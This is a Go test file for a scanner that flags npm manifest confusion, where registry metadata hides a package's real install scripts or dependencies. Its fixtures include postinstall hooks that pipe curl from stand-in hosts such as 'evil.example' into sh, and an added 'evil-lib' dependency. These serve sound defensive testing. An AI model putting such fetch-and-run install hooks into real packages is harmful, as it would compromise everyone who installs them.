package intelligence

import (
	"context"
	"testing"
)

func TestCompareNpmManifests_Match(t *testing.T) {
	reg := []byte(`{"versions":{"1.0.0":{"name":"x","version":"1.0.0","scripts":{"postinstall":"echo hi"}}}}`)
	tar := []byte(`{"name":"x","version":"1.0.0","scripts":{"postinstall":"echo hi"}}`)
	diffs := CompareNpmManifests(reg, tar, "1.0.0")
	if len(diffs) != 0 {
		t.Fatalf("expected no diffs, got %v", diffs)
	}
}

// Malicious fixture: publisher-tampered registry-side postinstall.
// Registry JSON drops the exfiltration script after upload so static
// review sees a clean package; the tarball actually installs curl|sh.
func TestCompareNpmManifests_ScriptTampering(t *testing.T) {
	reg := []byte(`{"versions":{"1.0.0":{"name":"x","version":"1.0.0","scripts":{"postinstall":"echo installed"}}}}`)
	tar := []byte(`{"name":"x","version":"1.0.0","scripts":{"postinstall":"curl http://evil.example/x | sh"}}`)
	diffs := CompareNpmManifests(reg, tar, "1.0.0")
	if len(diffs) == 0 {
		t.Fatalf("expected manifest-confusion diff on postinstall, got none")
	}
	found := false
	for _, d := range diffs {
		if d == "scripts.postinstall" {
			found = true
		}
	}
	if !found {
		t.Errorf("expected scripts.postinstall in diffs, got %v", diffs)
	}
}

func TestCompareNpmManifests_DependencyTampering(t *testing.T) {
	reg := []byte(`{"versions":{"1.0.0":{"name":"x","version":"1.0.0","dependencies":{"lodash":"^4.0.0"}}}}`)
	tar := []byte(`{"name":"x","version":"1.0.0","dependencies":{"lodash":"^4.0.0","evil-lib":"*"}}`)
	diffs := CompareNpmManifests(reg, tar, "1.0.0")
	if len(diffs) == 0 || diffs[0] != "dependencies" {
		t.Fatalf("expected dependencies diff, got %v", diffs)
	}
}

func TestCompareNpmManifests_WhitespaceInsensitive(t *testing.T) {
	reg := []byte(`{"versions":{"1.0.0":{"name":"x","version":"1.0.0","dependencies":{"a":"1.0.0","b":"2.0.0"}}}}`)
	// Same fields, different key order / formatting.
	tar := []byte(`{
        "name": "x",
        "version": "1.0.0",
        "dependencies": {
            "b": "2.0.0",
            "a": "1.0.0"
        }
    }`)
	diffs := CompareNpmManifests(reg, tar, "1.0.0")
	if len(diffs) != 0 {
		t.Fatalf("expected whitespace-insensitive match, got %v", diffs)
	}
}

func TestManifestConfusionProvider_NoRegistry(t *testing.T) {
	tgz := buildNPMTarball(t, map[string]string{
		"package/package.json": `{"name":"x","version":"1.0.0"}`,
	})
	req := Request{Key: Key{Ecosystem: "npm", Version: "1.0.0"}, Artifact: &ArtifactHandle{Bytes: tgz}}
	p := newManifestConfusionProvider()
	out, err := p.Run(context.Background(), req, nil)
	if err != nil {
		t.Fatal(err)
	}
	if out.Scan != nil && out.Scan.ManifestConfusion {
		t.Fatal("expected no-op when RegistryMetadataBytes is empty")
	}
}

func TestManifestConfusionProvider_Fires(t *testing.T) {
	tgz := buildNPMTarball(t, map[string]string{
		"package/package.json": `{"name":"x","version":"1.0.0","scripts":{"postinstall":"curl evil | sh"}}`,
	})
	req := Request{
		Key:                   Key{Ecosystem: "npm", Version: "1.0.0"},
		Artifact:              &ArtifactHandle{Bytes: tgz},
		RegistryMetadataBytes: []byte(`{"versions":{"1.0.0":{"name":"x","version":"1.0.0","scripts":{"postinstall":"echo ok"}}}}`),
	}
	p := newManifestConfusionProvider()
	out, err := p.Run(context.Background(), req, nil)
	if err != nil {
		t.Fatal(err)
	}
	if out.Scan == nil || !out.Scan.ManifestConfusion {
		t.Fatalf("expected ManifestConfusion=true, got %+v", out.Scan)
	}
}
